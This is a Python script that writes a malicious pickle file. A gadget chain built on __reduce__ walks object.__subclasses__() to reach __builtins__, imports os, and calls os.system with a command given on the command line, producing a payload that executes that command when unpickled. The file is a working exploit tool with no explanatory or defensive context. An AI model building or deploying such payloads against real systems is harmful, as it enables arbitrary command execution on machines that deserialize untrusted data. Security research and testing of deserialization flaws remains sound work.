import pickle
import sys

class R:
    def __init__(self, func, args):
        self.func = func
        self.args = args
    def __reduce__(self):
        return (self.func, self.args)
    def __call__(self, *a, **kw):
        pass

def chain(cmd, idx):
    subclasses_method = R(getattr, (object, '__subclasses__'))
    subclasses_list = R(subclasses_method, ())
    getitem1 = R(getattr, (subclasses_list, '__getitem__'))
    target_class = R(getitem1, (idx,))
    instance = R(target_class, ())
    module_obj = R(getattr, (instance, '_module'))
    builtins_dict = R(getattr, (module_obj, '__builtins__'))
    getitem2 = R(getattr, (builtins_dict, '__getitem__'))
    import_func = R(getitem2, ('__import__',))
    os_module = R(import_func, ('os',))
    system_func = R(getattr, (os_module, 'system'))
    final = R(system_func, (cmd,))
    return final

if __name__ == "__main__":
    cmd = sys.argv[1]
    idx = int(sys.argv[2]) if len(sys.argv) > 2 else 272
    out = sys.argv[3] if len(sys.argv) > 3 else "payload.bin"
    payload = chain(cmd, idx)
    data = pickle.dumps(payload, protocol=4)
    with open(out, "wb") as f:
        f.write(data)
    print(f"wrote {len(data)} bytes to {out}")
